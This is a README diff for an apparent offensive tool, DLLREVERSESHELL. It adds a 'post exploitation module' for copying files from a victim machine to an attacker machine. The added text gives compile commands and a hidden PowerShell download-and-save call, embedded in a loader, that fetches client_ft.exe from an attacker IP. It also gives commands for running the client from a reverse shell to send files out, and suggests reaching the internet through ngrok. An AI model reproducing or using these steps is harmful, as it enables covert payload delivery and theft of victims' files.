@@ -40,3 +40,47 @@ Cheers
 # DLLREVERSESHELL
 
 <b><p>https://youtu.be/HR0C_2_UAT8</p></b>
+
+
+# POST EXPLOITATION MODULE
+
+I have added a post exploitation module for file transfer , from the Victim machine to the Attacker machine.
+
+Compile the C program , ft_clie.c using 
+
+<p><b>i686-w64-mingw32-gcc ft_clie.c -o client_ft.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+ </p></b>
+ 
+ 
+ This is webdelivered to the victim , through the newly incorporated system() function call system("start powershell -windowstyle Hidden Invoke-WebRequest -Uri 'http://192.168.225.196/client_ft.exe' -OutFile 'client_ft.exe'"); , in loader.c 
+ 
+ <p><b> 
+  syntax to run client_ft.exe : 
+  
+  .\client_ft.exe ss.txt 192.168.225.196 4444
+  
+  or
+  
+  .\client_ft.exe <filename> <attackerip> <attackerport>
+  
+  from the reverse shell
+  </p></b>
+  
+  <p><b>
+  In the mean while , compile the serverfiletransfer.c using 
+  gcc serverfiletransfer.c -o serv 
+  
+  Syntax: ./serv <localattackerip> <chosenport> 
+  or 
+  ./serv 192.168.225.196 4444
+  
+ </p></b>
+ 
+ <p>
+ Once the reverse shell is obtained, ready the server using ./serv <localattackerip> <chosenport>  on a Linux terminal and on the Reverseshell , execute  .\client_ft.exe <filename> <attackerip> <attackerport> , to transfer files from the victim to the atacker machine. 
+  This exploit can be leveraged to WAN using ngrok.
+  </p>
+  
+  <b>https://youtu.be/KJOwew96pqw</b>
+  
+  # POST EXPLOITATION MODULE
